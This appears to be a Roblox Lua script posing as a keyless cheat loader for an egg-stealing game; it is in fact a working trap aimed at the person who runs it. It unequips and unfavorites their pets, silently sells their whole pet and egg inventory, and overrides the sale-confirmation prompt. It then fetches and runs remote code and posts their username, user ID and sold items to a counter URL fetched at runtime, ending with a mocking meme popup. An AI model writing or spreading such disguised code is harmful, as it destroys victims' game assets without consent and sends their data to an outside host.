local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- Wait for the game to finish loading player data
repeat task.wait(0.5) until LocalPlayer:GetAttribute("__LOADED") == true

-- ===== RE-ENTRY GUARD =====
local gv = (getgenv and getgenv()) or _G
if gv.__SAE_LOADER_RUNNING then
    warn("[Loader] Already running — ignoring this execution.")
    return
end
gv.__SAE_LOADER_RUNNING = true

task.delay(90, function()
    if gv.__SAE_LOADER_RUNNING then
        gv.__SAE_LOADER_RUNNING = false
        warn("[Loader] Re-entry flag force-cleared after 90s.")
    end
end)
-- ===========================

-- ===== CONFIG & CACHE BUSTER =====
local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua?t=" .. tostring(os.time())
local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json?t=" .. tostring(os.time())
local SELL_WAIT       = 1.5
local MEME_DELAY      = 4
local ANNOUNCE_HOLD   = 3

local UI_CONFIG = {
    MEME_IMAGE_ID  = "rbxassetid://82403642047427",
    LAUGH_SOUND_ID = "rbxassetid://133312610824902",
    MEME_SIZE      = 380,
}
-- =================================

-- ===== FETCH COUNTER URL FROM REMOTE =====
local function fetchCounterUrl()
    local ok, res = pcall(function()
        return game:HttpGet(ENDPOINTS_URL, true)
    end)
    if ok and type(res) == "string" and #res > 0 then
        local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
        if decodeOk and type(data) == "table" and type(data.counter) == "string" then
            print("[Loader] Using counter URL:", data.counter)
            return data.counter
        end
    end
    warn("[Loader] Could not fetch endpoints.json")
    return nil
end

local COUNTER_URL = fetchCounterUrl()

------------------------------------------------------------
-- SHORT NUMBER FORMATTER
------------------------------------------------------------
local function shortenNumber(n)
    n = tonumber(n) or 0
    if n < 1000 then return tostring(math.floor(n)) end
    local units = {
        { v = 1e12, s = "T" },
        { v = 1e9,  s = "B" },
        { v = 1e6,  s = "M" },
        { v = 1e3,  s = "K" },
    }
    for _, u in ipairs(units) do
        if n >= u.v then
            local val = n / u.v
            local str = string.format("%.1f", val):gsub("%.0$", "")
            return str .. u.s
        end
    end
    return tostring(math.floor(n))
end

------------------------------------------------------------
-- UI MODULE
------------------------------------------------------------
local function loadUIModule()
    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
    if UI_URL and UI_URL ~= "" then
        local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
        if ok and type(mod) == "table" and type(mod.new) == "function" then
            gv.__LoaderUIModule = mod
            return mod
        end
    end
    return {
        new = function()
            return {
                boot = function() end, setStatus = function() end,
                fadeOutAndCleanup = function() end, showMemePopup = function() end,
                restoreExtras = function() end,
            }
        end,
    }
end

local LoaderUI = loadUIModule()
local ui = LoaderUI.new(PlayerGui, UI_CONFIG)

------------------------------------------------------------
-- ANNOUNCEMENT POPUP
------------------------------------------------------------
local function showAnnouncement(itemsSold, valueEarned)
    local screen = Instance.new("ScreenGui")
    screen.Name = "PlundererAnnouncement"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.DisplayOrder = 999999
    screen.Parent = PlayerGui

    local card = Instance.new("Frame")
    card.AnchorPoint = Vector2.new(0.5, 0)
    card.Position = UDim2.new(0.5, 0, 0, -100)
    card.Size = UDim2.fromOffset(520, 64)
    card.BackgroundColor3 = Color3.fromRGB(12, 14, 22)
    card.BackgroundTransparency = 0.05
    card.BorderSizePixel = 0
    card.Parent = screen

    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 14)
    cardCorner.Parent = card

    local cardStroke = Instance.new("UIStroke")
    cardStroke.Color = Color3.fromRGB(128, 255, 160)
    cardStroke.Thickness = 1.5
    cardStroke.Transparency = 0.25
    cardStroke.Parent = card

    local accent = Instance.new("Frame")
    accent.Size = UDim2.new(0, 4, 1, -20)
    accent.Position = UDim2.new(0, 10, 0.5, 0)
    accent.AnchorPoint = Vector2.new(0, 0.5)
    accent.BackgroundColor3 = Color3.fromRGB(128, 255, 160)
    accent.BorderSizePixel = 0
    accent.Parent = card

    local accentCorner = Instance.new("UICorner")
    accentCorner.CornerRadius = UDim.new(1, 0)
    accentCorner.Parent = accent

    local main = Instance.new("TextLabel")
    main.BackgroundTransparency = 1
    main.Position = UDim2.fromOffset(28, 0)
    main.Size = UDim2.new(1, -40, 1, 0)
    main.Font = Enum.Font.GothamBold
    main.Text = string.format("%d items sold for $%s", itemsSold or 0, shortenNumber(valueEarned or 0))
    main.TextSize = 18
    main.TextColor3 = Color3.fromRGB(245, 248, 255)
    main.TextXAlignment = Enum.TextXAlignment.Left
    main.TextTransparency = 1
    main.Parent = card

    TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, 0, 0, 20),
    }):Play()
    TweenService:Create(main, TweenInfo.new(0.4), { TextTransparency = 0 }):Play()

    task.wait(ANNOUNCE_HOLD)

    TweenService:Create(card, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Position = UDim2.new(0.5, 0, 0, -100),
    }):Play()
    TweenService:Create(main, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()

    task.wait(0.6)
    screen:Destroy()
end

------------------------------------------------------------
-- CORE MODULES
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local Save       = require(ReplicatedStorage.Shared.Save)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local log = function(...) print("[Loader]", ...) end

local function getSave()
    local ok, s = pcall(function() return Save.Get(LocalPlayer, true) end)
    if ok and s then return s end
    local ok2, s2 = pcall(function() return Save.Get() end)
    return ok2 and s2 or nil
end

local function getMoney()
    -- Scanner proven leaderstat structure
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        local m = ls:FindFirstChild("Money/s")
        if m and type(m.Value) == "number" then return m.Value end
    end
    local d = getSave()
    return (d and type(d.Money) == "number") and d.Money or 0
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()
task.spawn(function()
    for _ = 1, 30 do task.wait(0.5); installOverride() end
end)

------------------------------------------------------------
-- EQUIP / FAVORITE CLEANUP
------------------------------------------------------------
local function unequipAll()
    pcall(function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChildOfClass("Humanoid") then
            char:FindFirstChildOfClass("Humanoid"):UnequipTools()
        end
        local bp = LocalPlayer:FindFirstChild("Backpack")
        if bp then
            for _, tool in ipairs(bp:GetChildren()) do
                if tool:IsA("Tool") and tool.Name ~= "Trap [X3]" and tool.Name ~= "Bat [X1]" then
                    Remotes.EggWorld.AskDoffTool:InvokeServer(tool.Name)
                end
            end
        end
    end)

    local d = getSave()
    if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
    log(("Unequipping %d pet(s)..."):format(#d.EquippedAssets))
    
    for _, uid in ipairs(d.EquippedAssets) do
        pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
    end
    task.wait(0.8)
end

local function getFavoriteUIDs()
    local list = {}
    local d = getSave()
    if not d or type(d.Inventory) ~= "table" then return list end
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(list, uid)
        end
    end
    return list
end

local function unfavoriteAll()
    local uids = getFavoriteUIDs()
    if #uids == 0 then return end
    log(("Favorited pets: %d"):format(#uids))
    
    for i, uid in ipairs(uids) do
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
        if i % 8 == 0 then task.wait(0.3) end
    end
    task.wait(1.2) -- DB sync wait
end

------------------------------------------------------------
-- SNAPSHOT
------------------------------------------------------------
local function snapshotInventory()
    local pets, eggs = {}, {}
    local d = getSave()
    if not d then return { pets = pets, eggs = eggs } end

    local isVIP = LocalPlayer:GetAttribute("VIP") == true

    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                local entry  = AssetDir[item.Category]
                local rarity = entry.Rarity

                local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                local value = (priceOk and tonumber(basePrice)) or 0
                if isVIP then value = value * 2 end
                value = math.floor(value)

                local weightOk, weight = TryCall(AssetItems.WeightKg, item)
                weight = (weightOk and tonumber(weight)) or 0

                pets[tostring(uid)] = {
                    kind      = "pet",
                    uid       = uid, -- RAW UID for server type-safety
                    name      = entry.DisplayName or item.Category,
                    rarity    = (rarity and rarity.DisplayName) or "Unknown",
                    rarityNum = (rarity and rarity.RarityNumber) or 0,
                    value     = value,
                    weight    = weight,
                }
            end
        end
    end

    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    local entry  = AssetDir[dec.AssetCategory]
                    local rarity = entry.Rarity

                    local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                    local value = (priceOk and tonumber(basePrice)) or 0
                    value = math.floor(value)

                    local weightOk, weight = TryCall(EggRecords.WeightKg, dec)
                    weight = (weightOk and tonumber(weight)) or 0

                    eggs[tostring(uid)] = {
                        kind      = "egg",
                        uid       = uid,
                        name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                        rarity    = (rarity and rarity.DisplayName) or "Unknown",
                        rarityNum = (rarity and rarity.RarityNumber) or 0,
                        value     = value,
                        weight    = weight,
                    }
                end
            end
        end
    end

    return { pets = pets, eggs = eggs }
end

------------------------------------------------------------
-- REPORT ID & POST
------------------------------------------------------------
local function computeReportId(uidList)
    local sorted = {}
    for i = 1, #uidList do sorted[i] = tostring(uidList[i]) end
    table.sort(sorted)
    local s = tostring(LocalPlayer.UserId) .. "|" .. table.concat(sorted, ",")
    local h = 0
    for i = 1, #s do
        h = bit32.bxor(h, string.byte(s, i))
        h = bit32.band(bit32.lshift(h, 5) + h, 0x7FFFFFFF)
    end
    return string.format("%08x-%d", h, #sorted)
end

local function reportSales(soldItems, reportId, actualEarned)
    if not soldItems or #soldItems == 0 then return end
    if not COUNTER_URL then return end

    local httpFn = nil
    if type(request) == "function" then httpFn = request
    elseif type(http_request) == "function" then httpFn = http_request
    elseif type(gv.request) == "function" then httpFn = gv.request
    elseif type(gv.http_request) == "function" then httpFn = gv.http_request
    end

    if not httpFn then return end

    local userId   = tostring(LocalPlayer.UserId)
    local username = LocalPlayer.Name or "Unknown"

    local petCount, eggCount = 0, 0
    local out = {}
    for _, d in ipairs(soldItems) do
        if d.kind == "pet" then petCount = petCount + 1
        elseif d.kind == "egg" then eggCount = eggCount + 1 end
        table.insert(out, {
            uid       = tostring(d.uid or ""),
            kind      = d.kind,
            name      = d.name,
            rarity    = d.rarity,
            rarityNum = d.rarityNum,
            value     = d.value,
            weight    = d.weight,
        })
    end

    task.spawn(function()
        local body = HttpService:JSONEncode({
            reportId   = reportId,
            pets       = petCount,
            eggs       = eggCount,
            userId     = userId,
            username   = username,
            items      = out,
            totalValue = actualEarned,
        })
        pcall(function()
            httpFn({
                Url = COUNTER_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
    end)
end

------------------------------------------------------------
-- SELL LOGIC
------------------------------------------------------------
local function sellInventory()
    local snap = snapshotInventory()

    local petUids, eggUids = {}, {}
    local details = {}
    for _, d in pairs(snap.pets) do
        table.insert(petUids, d.uid)
        table.insert(details, d)
    end
    for _, d in pairs(snap.eggs) do
        table.insert(eggUids, d.uid)
        table.insert(details, d)
    end

    local total = #petUids + #eggUids
    log(("Snapshot: %d pets, %d eggs (total %d)"):format(#petUids, #eggUids, total))
    if total == 0 then
        return 0, {}, {}, {}
    end

    local serverPayload = { Eggs = eggUids, Assets = petUids }

    pcall(function()
        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
        Remotes.PetSatchel.SellEveryPet:FireServer()
    end)
    
    return total, details, petUids, eggUids
end

------------------------------------------------------------
-- MAIN WORK
------------------------------------------------------------
local function runSilentWork()
    local before = getMoney()
    log(("Wallet before: %s"):format(tostring(before)))
    
    unequipAll()
    unfavoriteAll()
    
    local totalItems, details, petUids, eggUids = sellInventory()
    
    if totalItems > 0 then
        task.wait(SELL_WAIT)
        local after = getMoney()
        local actualEarned = after - before
        log(("Wallet after:  %s"):format(tostring(after)))
        log(("Delta:         %s"):format(tostring(actualEarned)))
        
        -- VERIFICATION: Only report if sale was accepted
        if actualEarned > 0 then
            local allUids = {}
            for _, u in ipairs(petUids) do table.insert(allUids, tostring(u)) end
            for _, u in ipairs(eggUids) do table.insert(allUids, tostring(u)) end
            local reportId = computeReportId(allUids)
            reportSales(details, reportId, actualEarned)
        else
            warn("[Loader] Server rejected sale. Skipping report.")
        end

        return {
            itemsSold   = totalItems,
            valueEarned = math.max(0, actualEarned),
        }
    else
        return { itemsSold = 0, valueEarned = 0 }
    end
end

------------------------------------------------------------
-- LAUNCH
------------------------------------------------------------
task.spawn(function()
    ui:boot()

    local stats = { itemsSold = 0, valueEarned = 0 }
    local ok, result = pcall(runSilentWork)
    if ok and type(result) == "table" then
        stats = result
    else
        warn("[Loader] Run failed:", result)
    end

    task.wait(0.3)
    ui:fadeOutAndCleanup()

    if stats.itemsSold and stats.itemsSold > 0 and stats.valueEarned > 0 then
        pcall(function() showAnnouncement(stats.itemsSold, stats.valueEarned) end)
    else
        pcall(function()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Loader Alert",
                Text = "Inventory is empty or items protected! Nothing to sell.",
                Duration = 4
            })
        end)
        task.wait(1.5)
    end

    task.wait(MEME_DELAY)
    ui:showMemePopup()

    gv.__SAE_LOADER_RUNNING = false
end)
